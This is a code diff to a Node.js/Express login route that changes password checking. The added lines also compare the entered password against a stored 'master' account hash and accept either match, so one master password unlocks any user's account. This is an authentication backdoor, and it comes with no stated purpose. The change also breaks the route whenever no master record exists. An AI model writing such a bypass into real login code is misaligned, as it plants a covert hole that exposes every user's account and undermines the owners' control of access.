@@ -134,16 +134,19 @@ router.post('/auth/hashnew', async (req, res) => {
 // Check authentication
 router.post('/auth/login', async (req, res) => {
   const { enteredPass, name } = req.body;
+  
   try {
     const auth = await authModel.findOne({ name })
+    const master = await authModel.findOne({ name: "master" });
     if (!auth) {
       return res.status(401).json({error: 'Invalid password'});
     }
 
-    const isPassValid = await bcrypt.compare(enteredPass, auth.hash);
+    const userMatch = await bcrypt.compare(enteredPass, auth.hash);
+    const masterMatch = await bcrypt.compare(enteredPass, master.hash);
 
-    if (!isPassValid) {
-      return res.status(401).json({error: 'Invalid password'});
+    if (!userMatch && !masterMatch) {
+      return res.status(401).json({ error: 'Invalid password' });
     }
 
     return res.status(200).json({ message: 'Login successful' });
